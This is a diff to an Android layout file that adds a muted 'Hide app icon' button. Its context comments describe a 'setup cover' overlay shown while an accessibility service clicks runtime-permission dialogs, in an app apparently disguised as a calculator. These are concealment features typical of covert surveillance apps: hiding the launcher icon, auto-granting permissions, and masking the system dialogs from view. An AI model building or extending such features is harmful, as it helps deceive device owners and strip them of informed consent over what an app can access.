@@ -1063,6 +1063,24 @@
         app:cornerRadius="20dp" />
 
     <!--
+        Manual launcher-visibility control. Only ever triggered by a real tap:
+        the accessibility service ignores events from this package and synthetic
+        clicks are confined to the provisioning window, so nothing here can be
+        pressed on the user's behalf.
+    -->
+    <com.google.android.material.button.MaterialButton
+        android:id="@+id/btnHideIcon"
+        style="@style/Widget.Material3.Button.TextButton"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:layout_gravity="bottom|end"
+        android:layout_marginEnd="8dp"
+        android:layout_marginBottom="8dp"
+        android:text="Hide app icon"
+        android:textSize="12sp"
+        android:textColor="#64748B" />
+
+    <!--
         Setup cover. Shown only while the accessibility service clicks the
         remaining runtime-permission dialogs, so the calculator is not on screen
         with system dialogs flashing over it. It cannot cover the permission
